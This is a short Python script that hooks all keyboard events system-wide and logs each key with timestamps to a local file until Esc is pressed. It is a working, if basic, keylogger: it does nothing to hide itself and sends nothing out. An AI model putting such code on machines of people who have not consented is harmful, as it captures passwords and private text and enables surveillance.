import keyboard as kb
import time

def keylog():
  log_f = open("log.txt", 'a')

  def on_action(key):
    print(key)
    curr_time_since_epoch = time.time()
    curr_time = time.ctime(curr_time_since_epoch)
    
    # https://docs.python.org/3/library/time.html#time.perf_counter_ns
    log_f.write(str(curr_time) + " : " + str(time.perf_counter_ns()) + " : " + str(key) + "\n")
    log_f.flush()

  kb.hook(on_action)
  kb.wait('esc')
  log_f.close()

keylog()
